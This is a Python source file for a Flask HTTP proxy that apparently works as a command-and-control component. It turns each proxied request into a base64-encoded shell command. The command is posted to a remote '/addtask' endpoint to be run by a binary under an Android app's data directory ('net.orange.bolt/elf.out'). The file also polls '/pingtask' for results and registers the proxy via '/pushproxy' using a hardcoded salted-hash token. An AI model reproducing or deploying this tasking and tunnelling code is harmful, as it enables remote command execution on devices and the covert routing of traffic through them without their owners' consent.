import socket, errno
import random, hashlib
from flask import Flask, Response
from flask import request
import requests, json, sys
import commands, base64, time
from mimetools import Message
from StringIO import StringIO


try:
	from urllib.parse import urlparse
except ImportError:
	from urlparse import urlparse



def customHash(deviceuuid):
	return hashlib.sha1("JYF&6rfvJY^R&D^P+';5r*"+deviceuuid+"JYF&6rfvJY^R&D^P+;5r*").hexdigest()[20:]



class duplexHTTProx:
	def __init__(self, deviceuuid, threaduuid, datapipe_path):
		self.deviceuuid = deviceuuid
		self.threaduuid = threaduuid
		self.datapipe = datapipe_path
		self.lport = 4321 if 0 else self.setPort()
		self.request_id = random.randint(10000, 99999)
		self.debug = True
		self.host = '0.0.0.0'
		self.app = Flask(self.deviceuuid)


	def setPort(self):
		setp = random.randint(49152, 65535)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.bind(("0.0.0.0", setp))
		except socket.error as e:
			if e.errno == errno.EADDRINUSE:
				self.setPort()
			else:
				print(e)
		s.close()
		return setp


	def run(self):
		self.app.add_url_rule('/','index', self.proxy, defaults={'path': ''})
		self.app.add_url_rule('/<path:path>' ,'proxy', self.proxy, methods=['GET','POST'])
		self.app.run(host=self.host, debug=self.debug, port=self.lport, use_reloader=False)


	def getRESP(self, taskid):
		resp_url = "http://{API_FQDN}/pingtask?hashid={}&token={}&taskid={}x{}".format(self.deviceuuid,\
			customHash(self.deviceuuid), self.threaduuid, taskid)
		resp_, counter_wait = "0", 0
		while len(resp_)<2:
			resp_ = requests.get(resp_url).content
			counter_wait += 1
			if counter_wait > 30:
				return 0
			time.sleep(1)
		request_base = resp_.split("\r\n\r\n")
		request_text = request_base[0]
		body_content = ''.join(i for i in request_base[1:])
		request_line, headers_alone = request_text.split('\r\n', 1)
		headers = Message(StringIO(headers_alone))
		resp_code = request_text.split('\r\n')[0].split(' ')[1]
		return body_content , resp_code, headers.dict


	def unAthorizedReq(self, req_uri):
		disAllowed_types = ['ai', 'bmp', 'gif', 'ico', 'jpeg', 'jpg', 'png', 'ps', 'psd', 'svg', 'tif', 'tiff']
		with_params = urlparse(req_uri).path.split('.')[-1]
		if '?' in with_params:
			with_params = with_params[:with_params.index('?')]
		if with_params in disAllowed_types:
			return 1
		return 0


	def proxy(self, path):
		global threads_running_
		while threads_running_>5:
			print threads_running_
			time.sleep(0.5)
		threads_running_ += 1
		path = request.__dict__['environ']['REQUEST_URI']
		print "[+] REQUEST_URI : {}".format(path)
		if self.unAthorizedReq(path):
			return ""
		parsed_path = urlparse(path)
		uri_path = '/' if not len(parsed_path.path) else parsed_path.path
		domain_ = parsed_path.netloc
		strict_ported = ":80"
		if ':' in domain_:
			strict_ported = parsed_path.netloc[parsed_path.netloc.index(":"):]
			if '/' in strict_ported:
				strict_ported = strict_ported[:strict_ported.index('/')]
		resolved_ = socket.gethostbyname(domain_.replace(strict_ported, ''))
		task_body = ""
		if request.method=='GET':
			s = 'echo -e "GET {} {}\r\n'.format(uri_path, request.__dict__['environ']['SERVER_PROTOCOL'])
			s += str(request.headers).replace("0.0.0.0:{}".format(self.lport), domain_).replace('keep-alive', 'close') + '" | {} {} {} '.format(self.datapipe, resolved_, strict_ported[1:])
			s = repr(s)[1:-1]
			task_body = base64.b64encode(s)
		elif request.method=='POST':
			s = 'echo -e "POST {} {}\r\n'.format(uri_path, request.__dict__['environ']['SERVER_PROTOCOL'])
			s += str(request.headers).replace("0.0.0.0:{}".format(self.lport), domain_).replace('keep-alive', 'close') + request.get_data().decode("utf8") +'" | {} {} {} '.format(self.datapipe, resolved_, strict_ported[1:])
			s = s.encode("utf8")
			s = repr(s)[1:-1]
			task_body = base64.b64encode(s)
		getRESP_re = 0
		while not getRESP_re:
			taskid = requests.get("http://{API_FQDN}/addtask?hashid={}&token={}&cmd={}".format(self.deviceuuid,\
			 customHash(self.deviceuuid), task_body)).content
			getRESP_re = self.getRESP(taskid)
		threads_running_ -= 1
		return getRESP_re




if __name__ == '__main__':
	threads_running_ = 0
	self_hostIP = "{API_FQDN_IP}"
	obj_ = duplexHTTProx(sys.argv[1], sys.argv[2], "/data/data/net.orange.bolt/elf.out")
	proxyInfo = "{}:{}".format(self_hostIP, obj_.lport)
	requests.get("http://{API_FQDN}/pushproxy?hashid={}&token={}&proxyinfo={}".format(obj_.deviceuuid,\
			 customHash(obj_.deviceuuid), proxyInfo))
	obj_.run()


